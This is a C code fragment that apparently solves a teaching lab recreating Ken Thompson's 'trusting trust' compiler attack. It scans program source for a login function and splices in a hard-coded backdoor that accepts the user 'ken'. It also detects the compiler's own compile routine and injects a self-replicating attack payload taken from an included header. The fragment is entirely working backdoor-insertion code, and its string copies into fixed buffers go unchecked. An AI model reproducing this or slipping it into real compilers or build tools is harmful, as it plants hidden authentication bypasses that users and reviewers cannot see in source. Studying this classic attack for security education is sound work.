// make #include appear on new line
#include "attack-array.h"
    // not a very robust finger-print, but what can you do.
    // in a real compiler we would do this match on the parse tree,
    // which strips out some non-essential features.
    static char compile_sig[] =
            "static void compile(char *program, char *outname) {\n"
            "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
            "    assert(fp);"
            ;

    static char login_sig[] = "int login(char *user) {";
    static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";

    /* your code goes here */
    char *login_sig_loc = strstr(program, login_sig);
    if (login_sig_loc != NULL) {
        static char tmp[8*1024*1024 + 1];
        size_t login_attack_offset = login_sig_loc - program + strlen(login_sig);
        strcpy(tmp, program + login_attack_offset);
        strcpy(program + login_attack_offset, login_attack);
        strcpy(program + login_attack_offset + strlen(login_attack), tmp);
    }

    char *compile_sig_loc = strstr(program, compile_sig);
    if (compile_sig_loc != NULL) {
        static char tmp[8*1024*1024 + 1];
        size_t compile_attack_offset = compile_sig_loc - program + strlen(compile_sig);
        strcpy(tmp, program + compile_attack_offset);
        strcpy(program + compile_attack_offset, compile_attack);
        strcpy(program + compile_attack_offset + strlen(compile_attack), tmp);
    }
